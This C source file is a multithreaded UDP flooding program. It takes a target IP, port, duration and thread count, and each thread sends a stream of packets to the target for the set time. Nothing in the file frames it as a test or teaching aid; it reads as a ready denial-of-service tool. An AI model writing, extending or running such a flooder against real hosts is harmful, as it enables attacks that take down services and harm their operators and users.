#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE 11000

typedef struct {
    char *ip;
    int port;
    int duration;
    int thread_id;
} thread_data;

void *send_udp_packets(void *arg) {
    thread_data *data = (thread_data *)arg;
    int sockfd;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    // Create a UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Prepare the sockaddr_in structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);

    time_t start_time = time(NULL);
    int packet_count = 0;

    while (difftime(time(NULL), start_time) < data->duration) {
        // Create a dynamic payload
        snprintf(payload, PAYLOAD_SIZE, "Thread %d - Packet %d", data->thread_id, packet_count++);
        
        // Send the UDP packet
        sendto(sockfd, payload, strlen(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    thread_data *data = malloc(num_threads * sizeof(thread_data));

    // Create threads
    for (int i = 0; i < num_threads; i++) {
        data[i].ip = ip;
        data[i].port = port;
        data[i].duration = duration;
        data[i].thread_id = i + 1; // Unique thread ID
        if (pthread_create(&threads[i], NULL, send_udp_packets, &data[i]) != 0) {
            perror("Failed to create thread");
            return 1;
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free(data);
    return 0;
}
